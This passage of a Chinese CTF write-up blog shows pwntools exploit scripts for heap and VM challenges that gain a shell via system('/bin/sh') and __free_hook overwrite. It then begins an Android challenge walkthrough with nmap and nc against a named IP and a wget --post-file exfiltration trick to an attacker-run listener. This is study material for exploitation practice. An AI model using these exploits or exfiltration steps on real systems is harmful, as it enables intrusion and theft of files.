   add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x2a0</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">7</span><span class="pun">):</span></code></li><li class="L3"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x2a0</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">        free</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x210</span><span class="pun">)</span><span class="pln"> </span><span class="com">#cut unsortedbin</span></code></li><li class="L8"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x2a0</span><span class="pun">)</span><span class="pln"> </span><span class="com">#smallbin 1</span></code></li><li class="L0"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x100</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x210</span><span class="pun">)</span><span class="pln"> </span><span class="com">#cut unsortedbin</span></code></li><li class="L8"><code class="language-py"><span class="pln">    </span><span class="com">#free(0)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x2a0</span><span class="pun">)</span><span class="pln"> </span><span class="com">#smallbin 2</span></code></li><li class="L0"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="str">'a'</span><span class="pun">*</span><span class="lit">0x210</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x91</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">heap_addr</span><span class="pun">+</span><span class="lit">0x6e0</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">buf_addr</span><span class="pun">-</span><span class="lit">0x10</span><span class="pun">))</span></code></li><li class="L3"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x88</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="lit">5</span><span class="pun">))</span></code></li><li class="L7"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'message: '</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">    libc_base </span><span class="pun">=</span><span class="pln"> u64</span><span class="pun">(</span><span class="pln">p</span><span class="pun">.</span><span class="pln">recv</span><span class="pun">(</span><span class="lit">6</span><span class="pun">).</span><span class="pln">ljust</span><span class="pun">(</span><span class="lit">8</span><span class="pun">,</span><span class="str">'\x00'</span><span class="pun">))-</span><span class="lit">0x3ebd20</span></code></li><li class="L9"><code class="language-py"><span class="pln">    </span><span class="kwd">print</span><span class="pun">(</span><span class="str">'libc_base: '</span><span class="pun">+</span><span class="pln">hex</span><span class="pun">(</span><span class="pln">libc_base</span><span class="pun">))</span></code></li><li class="L0"><code class="language-py"><span class="pln">    system_addr </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">sym</span><span class="pun">[</span><span class="str">'__libc_system'</span><span class="pun">]</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sh_addr </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">search</span><span class="pun">(</span><span class="str">'/bin/sh'</span><span class="pun">).</span><span class="pln">next</span><span class="pun">()</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="lit">6</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'end message: '</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">send</span><span class="pun">(</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">system_addr</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)*</span><span class="lit">5</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">sh_addr</span><span class="pun">))</span></code></li><li class="L7"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="lit">7</span><span class="pun">))</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><div class="md-section-divider"></div><h3 data-anchor-id="1sqs" id="补充">补充</h3><p data-anchor-id="9g8v">遍历 <code>unsorted bin</code> 前，会先遍历<code>fastbin</code>，<code>smallbin</code>里堆块。</p><p data-anchor-id="k4lw">在libc-2.27、2.29、2.30等<code>glibc</code>里，有一种<code>smallbin-tcachebin</code>的攻击方法，它可以把一块<strong>可控内存</strong>存入<code>tcachebin</code>中。 <br>
首先，对应的 <code>tcachebin</code> 和 <code>smallbin</code> 分别存入<strong>5</strong>个和<strong>2</strong>个。 <br>
将<code>smallbin</code>的第一个堆块的<code>bk</code>地址写入伪造的堆块的<code>fd</code>，伪造的堆块的<code>bk</code>写入一个存在的地址（如果想要泄露<code>libc</code>地址，可以写入一个<strong>可读地址-0x10</strong>的地址）。</p><p data-anchor-id="fafd"><img src="http://static.zybuluo.com/leafish/0d4ntjurjrxcbf5mi1okz5te/image_1e3mch0hn1e5o1fqo1g8egom34h9.png" alt="image_1e3mch0hn1e5o1fqo1g8egom34h9.png-427.8kB" title=""> <br>
上图第一个粉红荧光，仅判别了<code>smallbin</code>最后一个堆块，即被申请的堆块。第二个粉红荧光，在剩余堆块存入<code>tcachebin</code>前，<code>bin</code>(libc 里的索引指针）存入前向堆块的<code>fd</code>处。</p><div class="md-section-divider"></div><h2 id="easyvm">easyvm</h2><div class="md-section-divider"></div><h3 data-anchor-id="olp5" id="解题思路-5">解题思路</h3><p data-anchor-id="s9lh">逆向分析32位程序，发现大概模拟了系统寄存器，<code>ptr[8]</code>是<code>pc</code>命令计数器，<code>ptr[6]</code>是<code>esp</code>寄存器。 <br>
首先，使用选项4后，选项1、2可以泄露<strong>初始偏移</strong>。</p><p data-anchor-id="ya14">其次，由于<code>putchar()</code>只能读一字节，所以可以同时执行四次就可以打印出任意地址的值了。定位了got的地址，泄露出<code>__libc_start_main</code> 的地址，来计算出<code>libc</code>的偏移。算出<code>__free_hook</code>和<code>system</code>地址。</p><p data-anchor-id="3duy">然后，通过<code>getchar()</code>一次写一字节，将<code>system</code>地址写入<code>__free_hook</code>中。</p><p data-anchor-id="m321">最后，控制<code>free</code>堆块内容，在ptr[0]中写入字符串<code>sh</code>，触发选项3。</p><div class="md-section-divider"></div><h3 data-anchor-id="opjm" id="exp-6">exp</h3><p data-anchor-id="tytu">只有<code>context.log_level = "debug"</code>下无阻塞的运行成功。 <br>
其他模式，需要在<code>add()</code>函数里添加<code>sleep(0.1)</code></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="wvn3"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L1"><code class="language-py"><span class="kwd">import</span><span class="pln"> sys</span></code></li><li class="L2"><code class="language-py"><span class="kwd">import</span><span class="pln"> time</span></code></li><li class="L3"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">log_level </span><span class="pun">=</span><span class="pln"> </span><span class="str">"debug"</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">filename </span><span class="pun">=</span><span class="pln"> </span><span class="str">'./EasyVM'</span></code></li><li class="L7"><code class="language-py"><span class="pln">elf </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">libc </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="str">'libc-2.23.so'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"><span class="pln">        p </span><span class="pun">=</span><span class="pln"> process</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="kwd">else</span><span class="pun">:</span></code></li><li class="L3"><code class="language-py"><span class="pln">        p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">1</span><span class="pun">],</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">2</span><span class="pun">]))</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> sla</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="kwd">def</span><span class="pln"> add</span><span class="pun">(</span><span class="pln">content</span><span class="pun">):</span></code></li><li class="L0"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'&gt;&gt;&gt; \n'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sleep</span><span class="pun">(</span><span class="lit">0.1</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">send</span><span class="pun">(</span><span class="pln">content</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="kwd">def</span><span class="pln"> command</span><span class="pun">():</span></code></li><li class="L5"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'&gt;&gt;&gt; \n'</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">    sleep</span><span class="pun">(</span><span class="lit">0.1</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="str">'2'</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="kwd">def</span><span class="pln"> recycle</span><span class="pun">():</span></code></li><li class="L0"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'&gt;&gt;&gt; \n'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="kwd">def</span><span class="pln"> gift</span><span class="pun">():</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'&gt;&gt;&gt; \n'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'4'</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">if</span><span class="pln"> __name__ </span><span class="pun">==</span><span class="pln"> </span><span class="str">"__main__"</span><span class="pun">:</span></code></li><li class="L6"><code class="language-py"><span class="pln">    gift</span><span class="pun">()</span></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0x9</span><span class="pun">)+</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0x11</span><span class="pun">)+</span><span class="pln">p32</span><span class="pun">(</span><span class="lit">0x99</span><span class="pun">))</span><span class="pln"> </span><span class="com">#command</span></code></li><li class="L8"><code class="language-py"><span class="pln">    command</span><span class="pun">()</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'0x'</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    pie </span><span class="pun">=</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">p</span><span class="pun">.</span><span class="pln">recv</span><span class="pun">(</span><span class="lit">8</span><span class="pun">),</span><span class="pln"> </span><span class="lit">16</span><span class="pun">)-</span><span class="lit">0x6c0</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="pln">    data </span><span class="pun">=</span><span class="pln"> </span><span class="str">''</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">4</span><span class="pun">):</span></code></li><li class="L5"><code class="language-py"><span class="pln">        payload </span><span class="pun">=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="pln">pie </span><span class="pun">+</span><span class="pln"> elf</span><span class="pun">.</span><span class="pln">got</span><span class="pun">[</span><span class="str">'__libc_start_main'</span><span class="pun">]+</span><span class="pln">i</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">        payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x76</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x53</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">        payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x99</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="pln">payload</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">        command</span><span class="pun">()</span></code></li><li class="L0"><code class="language-py"><span class="pln">        data </span><span class="pun">+=</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">recv</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">    __libc_start_main </span><span class="pun">=</span><span class="pln"> u32</span><span class="pun">(</span><span class="pln">data</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    libc_addr </span><span class="pun">=</span><span class="pln"> __libc_start_main </span><span class="pun">-</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">symbols</span><span class="pun">[</span><span class="str">'__libc_start_main'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="kwd">print</span><span class="pun">(</span><span class="str">'libc: '</span><span class="pun">+</span><span class="pln">hex</span><span class="pun">(</span><span class="pln">libc_addr</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"><span class="pln">    system </span><span class="pun">=</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">symbols</span><span class="pun">[</span><span class="str">'system'</span><span class="pun">]+</span><span class="pln">libc_addr</span></code></li><li class="L6"><code class="language-py"><span class="pln">    __free_hook </span><span class="pun">=</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">symbols</span><span class="pun">[</span><span class="str">'__free_hook'</span><span class="pun">]+</span><span class="pln">libc_addr</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">    payload </span><span class="pun">=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="pln">__free_hook</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x76</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x54</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="pln">__free_hook </span><span class="pun">+</span><span class="pln"> </span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x76</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x54</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="pln">__free_hook </span><span class="pun">+</span><span class="pln"> </span><span class="lit">2</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x76</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x54</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="pln">__free_hook </span><span class="pun">+</span><span class="pln"> </span><span class="lit">3</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x76</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p32</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x54</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">    payload </span><span class="pun">+=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x99</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="pln">payload</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">    command</span><span class="pun">()</span></code></li><li class="L9"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">send</span><span class="pun">(</span><span class="pln">p32</span><span class="pun">(</span><span class="pln">system</span><span class="pun">))</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="pln">    payload </span><span class="pun">=</span><span class="pln"> p8</span><span class="pun">(</span><span class="lit">0x80</span><span class="pun">)+</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p16</span><span class="pun">(</span><span class="pln">u16</span><span class="pun">(</span><span class="str">'sh'</span><span class="pun">))+</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p8</span><span class="pun">(</span><span class="lit">0x99</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="pln">payload</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    command</span><span class="pun">()</span></code></li><li class="L4"><code class="language-py"><span class="pln">    recycle</span><span class="pun">()</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><div class="md-section-divider"></div><h3 data-anchor-id="deub" id="补充-1">补充</h3><ol data-anchor-id="umkh">
<li>打开创建结构体的 <code>Subview</code>，点击工具栏 <code>View-&gt;Open Subview-&gt;Structures</code>(<code>Shift + F9</code>)。</li>
<li>按键盘<code>Insert</code>弹出结构体的创建窗口，输入<code>Structure name</code>。</li>
<li>在结构体的<code>ends</code>行，按键盘<code>d</code>键，创建新的结构体成员。</li>
<li>在结构体成员初按<code>d</code>键，修改数据类型(<code>db dw dd dq</code>)，右键点击<code>Array</code>可以创建数组。 <br>
结构体创建完成后，效果如下： <br>
<img src="http://static.zybuluo.com/leafish/noeaxbpb7ladjp6end8c8d6n/image_1e3p36h6gntr11qi1sfv89qpc09.png" alt="image_1e3p36h6gntr11qi1sfv89qpc09.png-85.3kB" title=""></li>
<li>最后，分析代码。确定结构体中的成员在反汇编代码中的名称。之后，修改反编译代码中该 成员的类型，按 y 修改为<code>struct name</code>(注意是否是指针)。修改完成后，最终效果如下： <br>
<img src="http://static.zybuluo.com/leafish/0wh1s7ttqasjk60vvbvdh5ar/image_1e3p39t88h7a1gno1rvi1ggcccpm.png" alt="image_1e3p39t88h7a1gno1rvi1ggcccpm.png-62.1kB" title=""></li>
</ol><div class="md-section-divider"></div><h2 data-anchor-id="fout" id="getflag">getflag</h2><p data-anchor-id="lkzd"><strong>mobile</strong></p><p data-anchor-id="9s9q">扔到<code>JEB</code>里分析，发现提示存在远程的<code>APK</code></p><p data-anchor-id="ty63"><img src="http://static.zybuluo.com/leafish/5u93lj5peuib5v66grw07awr/image_1e3n3ma421g1q1ojd1516ikv1cok9.png" alt="image_1e3n3ma421g1q1ojd1516ikv1cok9.png-35.8kB" title=""></p><p data-anchor-id="v5bw">那么这APK应该是会有一个监听端口的功能，远程IP在哪呢？ <br>
翻到<code>assert</code>文件夹下可以看到<code>secret.txt</code>，内容是一段<code>base64</code>。 <br>
解码后：</p><pre data-anchor-id="8cv9"><code>The IP of the remote phone is 212.64.66.177
</code></pre><p data-anchor-id="hieg">nmap扫一下这个IP的端口：<code>nmap 212.64.66.177</code> ，发现<code>8080</code>这个端口是开着的</p><p data-anchor-id="6dza">连上：<code>nc 212.64.66.177 8080</code> ，返回一个数，每次都变，不知道干什么的。</p><hr><p data-anchor-id="ulhc">继续分析代码，在<code>onCreate()</code>函数中可以看到利用了<code>openFileOutput()</code>这个<code>API</code>新建了一个文件，这个文件会保存在应用的私有目录：<code>/data/data/com.xuanxuan.getflag/files/flag</code></p><p data-anchor-id="kr5r"><img src="http://static.zybuluo.com/leafish/jg93j2ppjpkfqnyutnf5b9to/image_1e3n5fcbj1o5c1omaco918i266km.png" alt="image_1e3n5fcbj1o5c1omaco918i266km.png-75.9kB" title=""></p><p data-anchor-id="jzb0"><img src="http://static.zybuluo.com/leafish/ej95qlwlrxb0h06h8rkycavy/image_1e3n5kj5k4391ulu1v4k12o1hfb13.png" alt="image_1e3n5kj5k4391ulu1v4k12o1hfb13.png-8kB" title=""></p><hr><p data-anchor-id="y3kj">然后分析点击事件，进而分析<code>ServerSocket_thread</code>线程，发现是监听的本地的<code>8080</code>端口</p><p data-anchor-id="bg0d"><img src="http://static.zybuluo.com/leafish/sp7r36az52z5p9andxjf3v5l/image_1e3n6oo8v1us91vcd31n13r31u2j1g.png" alt="image_1e3n6oo8v1us91vcd31n13r31u2j1g.png-41.5kB" title=""></p><p data-anchor-id="04hp">继续分析<code>Receive_Thread</code>线程，知道连接到这个端口发送的是一个随机数</p><p data-anchor-id="do1q"><img src="http://static.zybuluo.com/leafish/vn0zh475yn0thyihbub3v4cm/image_1e3n7co4su6t1j3sb7m1jfl1k0h1t.png" alt="image_1e3n7co4su6t1j3sb7m1jfl1k0h1t.png-69.9kB" title=""></p><p data-anchor-id="8n2n">继续分析，发现最多能读取接收的500个字节，然后收到数据和刚才生成的随机数会被送到<code>Checkpayload()</code>函数里</p><p data-anchor-id="7gtl"><img src="http://static.zybuluo.com/leafish/x7jpyo5qpj84b13dbcem1dtd/image_1e3n9dk8m1e5h9fp16edt7l1c042a.png" alt="image_1e3n9dk8m1e5h9fp16edt7l1c042a.png-77.6kB" title=""></p><p data-anchor-id="tsgy">跟进，数据转成<code>JSON</code>对象，对象里有两个字段，分别为<code>message</code>和<code>check</code>，然后会用传进来的随机数作为<code>HMAC</code>的<code>key</code>，算出<code>message</code>的校验码和<code>check</code>进行比较，如果通过，则过滤一些<code>message</code>的参数，利用<code>JAVA</code>的<code>Runtime</code>类执行<code>wget</code>拼接后面提交<code>message</code>。</p><p data-anchor-id="j4rq">目的是为了得到远程的<code>flag</code>。类似命令行参数<code>--post-file=/data/data/com.xuanxuan.getflag/files/flag your_server_address</code>。</p><p data-anchor-id="zi0z">然后根据开始的随机数计算校验码</p><div class="md-section-divider"></div><h3 data-anchor-id="c8hu" id="exp-7">exp</h3><p data-anchor-id="k39j">一开始无法使用<code>hashlib</code>库</p><blockquote data-anchor-id="uegw" class="white-blockquote">
  <p>"The quick and dirty fix is to remove the <br>
  /usr/lib/python2.7/lib-dynload/_hashlib.x86_64-linux-gnu.so file"</p>
  
  <p>After this it is possible to install hashlib with pip!</p>
</blockquote><p data-anchor-id="eu3f">第三方库<code>hmac</code>也需要上述如此重装</p><p data-anchor-id="pbp9">在自己服务器上打开一个监听端口</p><pre data-anchor-id="tfk7"><code>nc -lvp xxxxx
